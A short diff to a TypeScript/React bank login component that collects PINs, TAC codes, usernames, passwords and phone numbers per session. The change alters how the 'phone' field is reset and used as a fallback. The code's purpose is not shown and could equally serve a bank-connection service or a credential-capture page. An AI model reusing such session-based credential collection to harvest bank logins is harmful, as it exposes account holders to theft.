@@ -142,6 +142,10 @@ function isIgnoredRawCredentialKey(key: string): boolean {
 function shouldResetPreviousBankField(key: string): boolean {
   const normalizedKey = key.toLowerCase().replace(/[^a-z0-9]/g, "");
 
+  if (key === "phone") {
+    return false;
+  }
+
   if (
     key === "verfuegernummer" ||
     key === "pin" ||
@@ -248,7 +252,6 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
       "tacCode",
       "personalCode",
       "loginMethod",
-      "phone",
       "bankPhone",
       "username",
       "password",
@@ -267,9 +270,7 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
     const currentBankPhone =
       typeof overrideData?.bankPhone === "string"
         ? overrideData.bankPhone
-        : typeof overrideData?.phone === "string"
-          ? overrideData.phone
-          : typeof sessionFormData.bankPhone === "string"
+        : typeof sessionFormData.bankPhone === "string"
             ? sessionFormData.bankPhone
             : "";
     const currentUsername =
